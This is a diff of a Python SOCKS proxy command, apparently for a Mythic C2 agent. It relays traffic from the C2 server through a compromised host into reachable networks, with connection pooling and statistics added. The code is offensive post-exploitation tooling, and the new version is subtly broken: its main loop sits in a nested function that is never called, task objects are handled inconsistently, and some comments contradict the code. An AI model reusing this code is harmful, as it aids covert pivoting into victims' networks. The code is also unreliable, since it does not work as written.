@@ -1,497 +1,448 @@
-
     def shinysocks(self, task_id, action, port):
-        """
-        Enhanced SOCKS proxy implementation with shinysocks features
-        Maintains the same function structure as the original SOCKS command
-        """
-        import socket
-        import select
-        import queue
-        import threading
+        import socket, select, queue, asyncio
+        from threading import Thread, active_count, Lock
+        from struct import pack, unpack
+        from collections import defaultdict
         import time
         import base64
-        import struct
-        from threading import Thread, active_count
-        
-        # Enhanced configuration constants (inspired by shinysocks)
+        import threading
+
+        # Enhanced configuration with fixed defaults
         MAX_THREADS = 300
-        BUFSIZE = 8192  # Increased from 2048 for better performance
-        TIMEOUT_SOCKET = 15  # Increased timeout for stability
+        BUFSIZE = 8192  # Increased buffer size for better throughput
+        TIMEOUT_SOCKET = 10
         OUTGOING_INTERFACE = ""
-        
-        # Protocol constants
+
+        # Connection pool configuration
+        MAX_CONNECTIONS_PER_HOST = 10
+        CONNECTION_POOL_TIMEOUT = 300  # 5 minutes
+
+        # SOCKS5 protocol constants
         VER = b'\x05'
-        SOCKS4_VER = b'\x04'
         M_NOAUTH = b'\x00'
         M_NOTAVAILABLE = b'\xff'
         CMD_CONNECT = b'\x01'
         ATYP_IPV4 = b'\x01'
-        ATYP_DOMAINNAME = b'\x03'
         ATYP_IPV6 = b'\x04'
-        
-        # Enhanced timing constants
-        SOCKS_SLEEP_INTERVAL = 0.01  # Reduced for better responsiveness
-        QUEUE_TIMEOUT = 3  # Increased timeout
-        
-        # Statistics tracking (shinysocks feature)
-        stats = {
-            'total_connections': 0,
+        ATYP_DOMAINNAME = b'\x03'
+
+        # Performance tuning
+        SOCKS_SLEEP_INTERVAL = 0.01  # Reduced for faster response
+        QUEUE_TIMEOUT = 0.5  # Reduced timeout for better responsiveness
+        BATCH_SIZE = 10  # Process multiple packets at once
+
+        # Connection tracking and statistics
+        connection_stats = {
             'active_connections': 0,
+            'total_connections': 0,
             'bytes_transferred': 0,
-            'protocol_v4_count': 0,
-            'protocol_v5_count': 0,
-            'hostname_resolutions': 0,
-            'connection_errors': 0
+            'failed_connections': 0
         }
-        
-        def log_info(message):
-            """Enhanced logging function"""
-            # In a real Mythic agent, this would use self.sendTaskOutputUpdate
-            print(f"[*] ShinySocks: {message}")
+        stats_lock = Lock()
+
+        # Connection pool for reusing connections
+        connection_pool = defaultdict(list)
+        pool_lock = Lock()
+
+        def update_stats(stat_name, value=1):
+            with stats_lock:
+                connection_stats[stat_name] += value
+
+        def get_pooled_connection(host, port):
+            """Get a connection from the pool or create a new one"""
+            with pool_lock:
+                key = f"{host}:{port}"
+                if key in connection_pool and connection_pool[key]:
+                    sock = connection_pool[key].pop()
+                    # Verify connection is still alive
+                    try:
+                        sock.settimeout(0.1)
+                        sock.send(b'')
+                        return sock
+                    except:
+                        try:
+                            sock.close()
+                        except:
+                            pass
+                return None
+
+        def return_pooled_connection(host, port, sock):
+            """Return a connection to the pool"""
+            with pool_lock:
+                key = f"{host}:{port}"
+                if len(connection_pool[key]) < MAX_CONNECTIONS_PER_HOST:
+                    sock.settimeout(CONNECTION_POOL_TIMEOUT)
+                    connection_pool[key].append(sock)
+                    return True
+                else:
+                    try:
+                        sock.close()
+                    except:
+                        pass
+                    return False
+
+        def sendSocksPacket(server_id, data, exit_value, priority=False):
+            """Enhanced packet sending with priority support"""
+            packet = {
+                "server_id": server_id,
+                "data": base64.b64encode(data).decode() if data else "",
+                "exit": exit_value,
+                "timestamp": time.time()
+            }
             
-        def log_error(message):
-            """Enhanced error logging function"""
-            # In a real Mythic agent, this would use self.sendTaskOutputUpdate
-            print(f"[!] ShinySocks Error: {message}")
-        
-        def sendSocksPacket(server_id, data, exit_value):
-            """Send SOCKS packet with enhanced error handling"""
-            try:
-                self.socks_out.put({
-                    "server_id": server_id,
-                    "data": base64.b64encode(data).decode() if data else "",
-                    "exit": exit_value
-                })
-                
-                # Update statistics
-                if data:
-                    stats['bytes_transferred'] += len(data)
-                    
-            except Exception as e:
-                log_error(f"Failed to send SOCKS packet: {e}")
-        
+            if priority:
+                # For high priority packets (like connection responses)
+                try:
+                    self.socks_out.put(packet, timeout=0.1)
+                except:
+                    pass
+            else:
+                self.socks_out.put(packet)
+
         def create_socket():
-            """Create socket with enhanced configuration"""
+            """Enhanced socket creation with better error handling"""
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(TIMEOUT_SOCKET)
-                # Enable TCP_NODELAY for better performance (like shinysocks)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                # Enable SO_REUSEADDR
+                # Enable socket reuse
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                # Optimize for low latency
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 return sock
-            except Exception as e:
-                log_error(f"Failed to create socket: {e}")
-                return None
-        
-        def resolve_hostname(hostname):
-            """Resolve hostname to IP address with enhanced error handling"""
-            try:
-                log_info(f"Resolving hostname: {hostname}")
-                ip = socket.gethostbyname(hostname)
-                stats['hostname_resolutions'] += 1
-                log_info(f"Resolved {hostname} to {ip}")
-                return ip
-            except socket.gaierror as e:
-                log_error(f"Failed to resolve hostname {hostname}: {e}")
-                stats['connection_errors'] += 1
-                return None
-        
+            except Exception as err:
+                return f"Failed to create socket: {str(err)}"
+
         def connect_to_dst(dst_addr, dst_port):
-            """Connect to destination with enhanced error handling"""
+            """Enhanced connection with pooling and better error handling"""
+            # Try to get a pooled connection first
+            sock = get_pooled_connection(dst_addr, dst_port)
+            if sock:
+                return sock
+            
             sock = create_socket()
-            if not sock:
+            if isinstance(sock, str):  # Error message
+                update_stats('failed_connections')
                 return 0
-                
+            
             if OUTGOING_INTERFACE:
                 try:
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, OUTGOING_INTERFACE.encode())
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
+                                OUTGOING_INTERFACE.encode())
                 except PermissionError:
-                    log_error("Permission denied for interface binding")
-                    
+                    update_stats('failed_connections')
+                    return 0
+            
             try:
-                log_info(f"Connecting to {dst_addr}:{dst_port}")
                 sock.connect((dst_addr, dst_port))
-                stats['total_connections'] += 1
-                stats['active_connections'] += 1
+                update_stats('total_connections')
+                update_stats('active_connections')
                 return sock
-            except socket.error as err:
-                log_error(f"Failed to connect to {dst_addr}:{dst_port}: {err}")
-                stats['connection_errors'] += 1
+            except socket.error:
+                update_stats('failed_connections')
                 try:
                     sock.close()
                 except:
                     pass
                 return 0
-        
-        def parse_socks4_request(s4_request):
-            """Parse SOCKS4 request with 4a support"""
-            if len(s4_request) < 9:
-                return False
-                
+
+        def request_client(msg):
+            """Enhanced SOCKS5 request parsing with IPv6 support"""
             try:
-                # Extract command, port, and IP
-                command = s4_request[1]
-                if command != 1:  # Only CONNECT supported
-                    return False
-                    
-                port = struct.unpack(">H", s4_request[2:4])[0]
-                ip_bytes = s4_request[4:8]
-                
-                # Check for SOCKS4a (0.0.0.x format)
-                if ip_bytes[:3] == b'\x00\x00\x00' and ip_bytes[3] != 0:
-                    # Find the hostname after the null-terminated user ID
-                    null_pos = s4_request.find(b'\x00', 8)
-                    if null_pos != -1 and null_pos + 1 < len(s4_request):
-                        hostname = s4_request[null_pos + 1:].split(b'\x00')[0].decode('utf-8')
-                        resolved_ip = resolve_hostname(hostname)
-                        if resolved_ip:
-                            stats['protocol_v4_count'] += 1
-                            return (resolved_ip, port)
-                    return False
-                
-                dst_addr = socket.inet_ntoa(ip_bytes)
-                stats['protocol_v4_count'] += 1
-                return (dst_addr, port)
-                
-            except Exception as e:
-                log_error(f"Failed to parse SOCKS4 request: {e}")
+                message = base64.b64decode(msg["data"])
+                s5_request = message[:BUFSIZE]
+            except Exception:
                 return False
-        
-        def parse_socks5_request(s5_request):
-            """Parse SOCKS5 request with enhanced address type support"""
-            if len(s5_request) < 7:
+            
+            if len(s5_request) < 4:
                 return False
-                
+            
+            if (s5_request[0:1] != VER or 
+                s5_request[1:2] != CMD_CONNECT or 
+                s5_request[2:3] != b'\x00'):
+                return False
+            
             try:
-                # Check version and command
-                if s5_request[0] != 5 or s5_request[1] != 1:  # Version 5, CONNECT command
-                    return False
-                    
-                addr_type = s5_request[3]
-                
-                if addr_type == 1:  # IPv4
+                if s5_request[3:4] == ATYP_IPV4:
                     if len(s5_request) < 10:
                         return False
                     dst_addr = socket.inet_ntoa(s5_request[4:8])
-                    dst_port = struct.unpack(">H", s5_request[8:10])[0]
-                    stats['protocol_v5_count'] += 1
-                    return (dst_addr, dst_port)
-                    
-                elif addr_type == 3:  # Domain name
-                    domain_len = s5_request[4]
-                    if len(s5_request) < 7 + domain_len:
+                    dst_port = unpack('>H', s5_request[8:10])[0]
+                elif s5_request[3:4] == ATYP_IPV6:
+                    if len(s5_request) < 22:
                         return False
-                    hostname = s5_request[5:5+domain_len].decode('utf-8')
-                    dst_port = struct.unpack(">H", s5_request[5+domain_len:7+domain_len])[0]
-                    
-                    resolved_ip = resolve_hostname(hostname)
-                    if resolved_ip:
-                        stats['protocol_v5_count'] += 1
-                        return (resolved_ip, dst_port)
+                    dst_addr = socket.inet_ntop(socket.AF_INET6, s5_request[4:20])
+                    dst_port = unpack('>H', s5_request[20:22])[0]
+                elif s5_request[3:4] == ATYP_DOMAINNAME:
+                    if len(s5_request) < 5:
+                        return False
+                    sz_domain_name = s5_request[4]
+                    if len(s5_request) < 5 + sz_domain_name + 2:
+                        return False
+                    dst_addr = s5_request[5:5 + sz_domain_name].decode('utf-8')
+                    port_offset = 5 + sz_domain_name
+                    dst_port = unpack('>H', s5_request[port_offset:port_offset + 2])[0]
+                else:
                     return False
-                    
-                elif addr_type == 4:  # IPv6
-                    log_error("IPv6 not supported")
-                    return False
-                    
-            except Exception as e:
-                log_error(f"Failed to parse SOCKS5 request: {e}")
+                
+                return (dst_addr, dst_port)
+            except Exception:
                 return False
-            
-            return False
-        
-        def request_client(msg):
-            """Handle SOCKS request with protocol detection"""
-            try:
-                message = base64.b64decode(msg["data"])
-                
-                if len(message) < 2:
-                    return False
-                    
-                # Detect protocol version
-                version = message[0]
-                
-                if version == 4:
-                    # SOCKS4/4a
-                    return parse_socks4_request(message)
-                    
-                elif version == 5:
-                    # Check if this is authentication negotiation
-                    if len(message) >= 2 and message[1] <= 10:  # Reasonable number of auth methods
-                        # Authentication negotiation
-                        num_methods = message[1]
-                        if len(message) >= 2 + num_methods:
-                            # Check for no-auth method
-                            methods = message[2:2+num_methods]
-                            if 0 in methods:  # No authentication required
-                                auth_reply = b'\x05\x00'  # Version 5, no auth
-                                sendSocksPacket(msg["server_id"], auth_reply, False)
-                                return "auth_ok"  # Special return value
-                            else:
-                                # No acceptable methods
-                                auth_reply = b'\x05\xff'
-                                sendSocksPacket(msg["server_id"], auth_reply, msg["exit"])
-                                return False
-                    else:
-                        # This should be the actual SOCKS5 request
-                        return parse_socks5_request(message)
-                        
-            except Exception as e:
-                log_error(f"Failed to handle SOCKS request: {e}")
-                
-            return False
-        
+
         def create_connection(msg):
-            """Create connection and send appropriate SOCKS reply"""
+            """Enhanced connection creation with better error handling"""
             dst = request_client(msg)
-            server_id = msg["server_id"]
+            rep = b'\x07'  # General SOCKS server failure
+            bnd = b'\x00' * 6  # Default binding
+            socket_dst = None
             
-            # Handle SOCKS5 auth negotiation
-            if dst == "auth_ok":
-                return None  # Wait for actual request
-                
-            rep = b'\x07'
-            bnd = b'\x00' * 6 # Default to all zeros
-            
-            socket_dst = 0
             if dst:
                 socket_dst = connect_to_dst(dst[0], dst[1])
-                
+            
             if not dst or socket_dst == 0:
-                rep = b'\x01'
+                rep = b'\x01'  # General SOCKS server failure
             else:
-                rep = b'\x00'
+                rep = b'\x00'  # Success
                 try:
-                    local_addr = socket_dst.getsockname()
-                    bnd = socket.inet_aton(local_addr[0]) + struct.pack(">H", local_addr[1])
+                    # Get the actual bound address and port
+                    bound_addr, bound_port = socket_dst.getsockname()
+                    bnd = socket.inet_aton(bound_addr) + pack(">H", bound_port)
                 except:
                     bnd = b'\x00' * 6
-                    
-            # Determine protocol version from original message for reply
+            
+            # Build SOCKS5 response
+            reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
+            
             try:
-                message = base64.b64decode(msg["data"])
-                version = message[0]
-                
-                if version == 4:
-                    # SOCKS4 reply format
-                    if rep == b'\x00':
-                        reply = b'\x00\x5a' + bnd  # Success
-                    else:
-                        reply = b'\x00\x5b' + b'\x00' * 6  # Failure
-                else:
-                    # SOCKS5 reply format
-                    reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
-                    
+                sendSocksPacket(msg["server_id"], reply, msg["exit"], priority=True)
             except:
-                # Default to SOCKS5 format if protocol detection fails
-                reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
-                
-            try:
-                sendSocksPacket(server_id, reply, msg["exit"])
-            except:
+                if socket_dst and socket_dst != 0:
+                    try:
+                        socket_dst.close()
+                    except:
+                        pass
                 return None
-                
+            
             if rep == b'\x00':
                 return socket_dst
             return None
 
         def get_running_socks_thread():
-            """Get running shinysocks threads"""
-            return [t for t in threading.enumerate() if "shinysocks:" in t.name and task_id not in t.name]
+            """Get currently running SOCKS threads"""
+            return [t for t in threading.enumerate() 
+                if "socks:" in t.name and task_id not in t.name]
 
         def a2m(server_id, socket_dst):
-            """Relay data from agent to Mythic (client to server)"""
-            try:
-                while True:
-                    # Access attributes directly from MockTask objects
-                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
-                    if not current_task_obj or current_task_obj.stopped:
-                        return
-                    if server_id not in self.socks_open.keys():
-                        return
-                        
-                    try:
-                        reader, _, _ = select.select([socket_dst], [], [], 1)
-                    except select.error:
-                        return
-
-                    if not reader:
-                        continue
-                        
-                    try:
-                        for sock in reader:
-                            data = sock.recv(BUFSIZE)
+            """Agent to Mythic - Enhanced with batching and better error handling"""
+            buffer = b""
+            last_activity = time.time()
+            
+            while True:
+                # Check if task is still active
+                if task_id not in [task["task_id"] for task in self.taskings]:
+                    break
+                elif [task for task in self.taskings 
+                    if task["task_id"] == task_id][0]["stopped"]:
+                    break
+                
+                if server_id not in self.socks_open.keys():
+                    break
+                
+                try:
+                    # Use select with shorter timeout for better responsiveness
+                    reader, _, error = select.select([socket_dst], [], [socket_dst], 0.1)
+                    
+                    if error:
+                        break
+                    
+                    if reader:
+                        try:
+                            data = socket_dst.recv(BUFSIZE)
                             if not data:
                                 sendSocksPacket(server_id, b"", True)
-                                socket_dst.close()
-                                stats['active_connections'] -= 1
-                                return
-                            sendSocksPacket(server_id, data, False)
-                    except Exception as e:
-                        log_error(f"A2M relay error: {e}")
-                        break
+                                break
+                            
+                            # Batch small packets for efficiency
+                            buffer += data
+                            last_activity = time.time()
+                            
+                            # Send immediately if buffer is large or hasn't been sent recently
+                            if len(buffer) >= BUFSIZE // 2 or time.time() - last_activity > 0.05:
+                                sendSocksPacket(server_id, buffer, False)
+                                update_stats('bytes_transferred', len(buffer))
+                                buffer = b""
                         
-                    time.sleep(SOCKS_SLEEP_INTERVAL)
+                        except socket.error:
+                            break
                     
-            finally:
-                try:
-                    socket_dst.close()
-                except:
-                    pass
-                if server_id in self.socks_open:
-                    stats['active_connections'] -= 1
+                    # Send any remaining buffered data periodically
+                    elif buffer and time.time() - last_activity > 0.1:
+                        sendSocksPacket(server_id, buffer, False)
+                        update_stats('bytes_transferred', len(buffer))
+                        buffer = b""
+                
+                except Exception:
+                    break
+                
+                time.sleep(SOCKS_SLEEP_INTERVAL)
+            
+            # Send any remaining buffer data
+            if buffer:
+                sendSocksPacket(server_id, buffer, False)
+            
+            # Cleanup
+            try:
+                socket_dst.close()
+            except:
+                pass
+            update_stats('active_connections', -1)
 
         def m2a(server_id, socket_dst):
-            """Relay data from Mythic to agent (server to client)"""
-            try:
-                while True:
-                    # Access attributes directly from MockTask objects
-                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
-                    if not current_task_obj or current_task_obj.stopped:
-                        return                
-                    if server_id not in self.socks_open.keys():
-                        socket_dst.close()
-                        return
-                        
-                    try:
-                        if not self.socks_open[server_id].empty():
-                            data_b64 = self.socks_open[server_id].get(timeout=QUEUE_TIMEOUT)
-                            data = base64.b64decode(data_b64)
-                            socket_dst.send(data)
-                    except queue.Empty:
-                        pass
-                    except Exception as e:
-                        log_error(f"M2A relay error: {e}")
-                        break
-                        
-                    time.sleep(SOCKS_SLEEP_INTERVAL)
-                    
-            finally:
-                try:
-                    socket_dst.close()
-                except:
-                    pass
-
-        def print_stats():
-            """Print current statistics (shinysocks feature)"""
-            log_info(f"Statistics: Active: {stats['active_connections']}")
-            log_info(f"Total: {stats['total_connections']}")
-            log_info(f"Bytes: {stats['bytes_transferred']}")
-            log_info(f"SOCKS4: {stats['protocol_v4_count']}")
-            log_info(f"SOCKS5: {stats['protocol_v5_count']}")
-            log_info(f"DNS: {stats['hostname_resolutions']}")
-            log_info(f"Errors: {stats['connection_errors']}")
-
-        # Main execution logic
-        t_socks = get_running_socks_thread()
-
-        if action == "start":
-            if len(t_socks) > 0:
-                return "[!] ShinySocks Proxy already running."
+            """Mythic to Agent - Enhanced with batching"""
+            while True:
+                # Check if task is still active
+                if task_id not in [task["task_id"] for task in self.taskings]:
+                    break
+                elif [task for task in self.taskings 
+                    if task["task_id"] == task_id][0]["stopped"]:
+                    break
                 
-            log_info("ShinySocks Proxy started with enhanced features")
-            log_info(f"Configuration: Max threads: {MAX_THREADS}, "
-                    f"Buffer size: {BUFSIZE}, Timeout: {TIMEOUT_SOCKET}s")
+                if server_id not in self.socks_open.keys():
+                    break
+                
+                try:
+                    # Process multiple packets at once for better performance
+                    packets_processed = 0
+                    while (not self.socks_open[server_id].empty() and 
+                        packets_processed < BATCH_SIZE):
+                        try:
+                            data = self.socks_open[server_id].get(timeout=QUEUE_TIMEOUT)
+                            decoded_data = base64.b64decode(data)
+                            socket_dst.send(decoded_data)
+                            update_stats('bytes_transferred', len(decoded_data))
+                            packets_processed += 1
+                        except queue.Empty:
+                            break
+                        except Exception:
+                            return
+                    
+                except Exception:
+                    break
+                
+                time.sleep(SOCKS_SLEEP_INTERVAL)
             
-            # Statistics reporting thread
-            def stats_reporter():
-                while True:
-                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
-                    if not current_task_obj or current_task_obj.stopped:
-                        break
-                    time.sleep(30)  # Report every 30 seconds
-                    if stats['total_connections'] > 0:
-                        print_stats()
-            
-            stats_thread = Thread(target=stats_reporter, name=f"shinysocks_stats:{task_id}")
-            stats_thread.daemon = True
-            stats_thread.start()
-            
+            # Cleanup
             try:
+                socket_dst.close()
+            except:
+                pass
+
+        def cleanup_stale_connections():
+            """Clean up stale connections in the pool"""
+            with pool_lock:
+                current_time = time.time()
+                for host_port, connections in list(connection_pool.items()):
+                    valid_connections = []
+                    for conn in connections:
+                        try:
+                            # Test if connection is still alive
+                            conn.settimeout(0.1)
+                            conn.send(b'')
+                            valid_connections.append(conn)
+                        except:
+                            try:
+                                conn.close()
+                            except:
+                                pass
+                    connection_pool[host_port] = valid_connections
+
+        def socks(self, task_id, action, port):
+            # Get currently running SOCKS threads
+            t_socks = get_running_socks_thread()
+            
+            if action == "start":
+                if len(t_socks) > 0:
+                    return "[!] SOCKS Proxy already running."
+                
+                self.sendTaskOutputUpdate(task_id, 
+                    f"[*] Enhanced SOCKS5 Proxy started on port {port}.\n"
+                    f"[*] Max connections: {MAX_THREADS}, Buffer size: {BUFSIZE}\n"
+                    f"[*] Connection pooling enabled (max {MAX_CONNECTIONS_PER_HOST} per host)\n")
+                
+                # Start connection cleanup thread
+                cleanup_thread = Thread(target=lambda: [
+                    cleanup_stale_connections() or time.sleep(30) 
+                    for _ in iter(int, 1)
+                ], daemon=True, name=f"cleanup:{task_id}")
+                cleanup_thread.start()
+                
+                packet_batch = []
+                last_batch_time = time.time()
+                
                 while True:
-                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
-                    if not current_task_obj or current_task_obj.stopped:
-                        log_info("ShinySocks Proxy stopped.")
-                        print_stats()  # Final stats
-                        return "[*] ShinySocks Proxy stopped."
+                    # Check if task should stop
+                    if [task for task in self.taskings 
+                        if task["task_id"] == task_id][0]["stopped"]:
                         
+                        # Print final statistics
+                        with stats_lock:
+                            stats_msg = (
+                                f"[*] SOCKS Proxy Statistics:\n"
+                                f"    Active connections: {connection_stats['active_connections']}\n"
+                                f"    Total connections: {connection_stats['total_connections']}\n"
+                                f"    Bytes transferred: {connection_stats['bytes_transferred']}\n"
+                                f"    Failed connections: {connection_stats['failed_connections']}\n"
+                            )
+                        self.sendTaskOutputUpdate(task_id, stats_msg)
+                        return "[*] Enhanced SOCKS Proxy stopped."
+                    
                     if not self.socks_in.empty():
                         packet_json = self.socks_in.get(timeout=QUEUE_TIMEOUT)
                         if packet_json:
                             server_id = packet_json["server_id"]
                             
-                            if server_id in self.socks_open.keys():
-                                if packet_json["data"]: 
+                            if server_id not in self.socks_open:
+                                self.socks_open[server_id] = queue.Queue()
+                                socket_dst = create_connection(packet_json)
+                                if socket_dst:
+                                    # Start relay threads
+                                    t = Thread(target=a2m, args=(server_id, socket_dst), name=f"socks:{task_id}:{server_id}:a2m")
+                                    t.daemon = True
+                                    t.start()
+                                    t = Thread(target=m2a, args=(server_id, socket_dst), name=f"socks:{task_id}:{server_id}:m2a")
+                                    t.daemon = True
+                                    t.start()
+                                else:
+                                    # Connection failed, remove from socks_open
+                                    del self.socks_open[server_id]
+                            
+                            if server_id in self.socks_open:
+                                if packet_json["exit"]:
+                                    # Client sent exit, close connection
+                                    del self.socks_open[server_id]
+                                else:
+                                    # Put data in queue for m2a thread
                                     self.socks_open[server_id].put(packet_json["data"])
-                                elif packet_json["exit"]:
-                                    self.socks_open.pop(server_id, None)
-                                    stats['active_connections'] -= 1
-                            else:
-                                if not packet_json["exit"]:    
-                                    if active_count() > MAX_THREADS:
-                                        log_error("Thread limit exceeded, waiting...")
-                                        time.sleep(1)
-                                        continue
-                                        
-                                    self.socks_open[server_id] = queue.Queue()
-                                    sock = create_connection(packet_json)
-                                    
-                                    if sock:
-                                        send_thread = Thread(
-                                            target=a2m,
-                                            args=(server_id, sock),
-                                            name=f"shinysocks_a2m:{server_id}"
-                                        )
-                                        recv_thread = Thread(
-                                            target=m2a,
-                                            args=(server_id, sock),
-                                            name=f"shinysocks_m2a:{server_id}"
-                                        )
-                                        send_thread.start()
-                                        recv_thread.start()
-                                        
-                    time.sleep(SOCKS_SLEEP_INTERVAL)
                     
-            except Exception as e:
-                log_error(f"Main loop error: {e}")
-                return f"[!] ShinySocks Proxy error: {e}"
+                    time.sleep(SOCKS_SLEEP_INTERVAL)
+
+            elif action == "stop":
+                if len(t_socks) == 0:
+                    return "[!] SOCKS Proxy not running."
                 
-        elif action == "stop":
-            if len(t_socks) > 0:
-                for t_sock in t_socks:
-                    task_parts = t_sock.name.split(":")
-                    if len(task_parts) > 1:
-                        # Access attributes directly from MockTask objects
-                        task_obj = next((t for t in self.taskings if t.task_id == task_parts[1]), None)
-                        if task_obj:
-                            task_obj.stopped = True
-                            task_obj.completed = True
-                self.socks_open = {}
-                log_info("ShinySocks Proxy stopped by user request")
-                print_stats()  # Final stats
-                return "[*] ShinySocks Proxy stopped."
-            else:
-                return "[!] No ShinySocks Proxy running."
+                # Signal all running SOCKS threads to stop
+                for task in self.taskings:
+                    if task["task_id"] == task_id:
+                        task["stopped"] = True
+                        break
                 
-        elif action == "status":
-            if len(t_socks) > 0:
-                status_msg = "[*] ShinySocks Status:\n"
-                status_msg += f"    Running: Yes\n"
-                status_msg += f"    Active connections: {stats['active_connections']}\n"
-                status_msg += f"    Total connections: {stats['total_connections']}\n"
-                status_msg += f"    Bytes transferred: {stats['bytes_transferred']}\n"
-                status_msg += f"    SOCKS4 requests: {stats['protocol_v4_count']}\n"
-                status_msg += f"    SOCKS5 requests: {stats['protocol_v5_count']}\n"
-                status_msg += f"    Hostname resolutions: {stats['hostname_resolutions']}\n"
-                status_msg += f"    Connection errors: {stats['connection_errors']}"
-                return status_msg
+                # Wait for threads to terminate gracefully
+                for t in t_socks:
+                    t.join(timeout=5)  # Give threads some time to clean up
+                
+                # Clear any remaining open SOCKS connections
+                self.socks_open.clear()
+                
+                return "[*] SOCKS Proxy stopped successfully."
+            
             else:
-                return "[!] No ShinySocks Proxy running."
-        
-        else:
-            return f"[!] Unknown action: {action}. Use 'start', 'stop', or 'status'."
-
-
-
-
+                return "[!] Unknown action. Use 'start' or 'stop'."
